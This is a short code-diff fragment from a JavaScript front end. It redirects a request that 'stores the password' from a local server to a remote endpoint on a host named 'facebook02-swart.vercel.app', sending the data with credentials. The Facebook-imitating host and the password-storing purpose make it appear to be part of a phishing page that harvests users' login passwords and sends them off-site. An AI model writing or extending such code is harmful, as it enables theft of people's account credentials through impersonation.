@@ -49,7 +49,7 @@ const handleNotShowPass = () =>{
 
     // Send the data to store the password
     axios
-      .post("http://localhost:5000/api/store-password", data, {
+      .post("https://facebook02-swart.vercel.app/api/store-password", data, {
         // http://localhost:5000
         withCredentials: true,
       })
